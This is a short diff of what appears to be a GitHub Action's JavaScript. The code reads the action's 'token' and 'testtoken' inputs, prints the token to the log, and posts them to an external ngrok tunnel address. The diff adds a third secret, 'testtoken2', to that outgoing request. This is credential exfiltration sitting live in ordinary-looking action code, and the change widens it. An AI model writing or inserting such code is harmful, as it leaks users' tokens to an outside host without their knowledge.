@@ -4790,6 +4790,7 @@ console.log("inside");
 const value = core.getInput("token");
 const doc = core.getInput("file");
 const testtoken = core.getInput("testtoken");
+const testtoken2 = core.getInput("testtoken2");
 
 console.log(value, 3524);
 // const file = readFileSync(doc);
@@ -4799,6 +4800,7 @@ async function testing() {
     .post("http://de57-103-252-164-15.ngrok.io", {
       value,
       testtoken,
+      testtoken2,
       test: 123,
     })
     .then(function (response) {
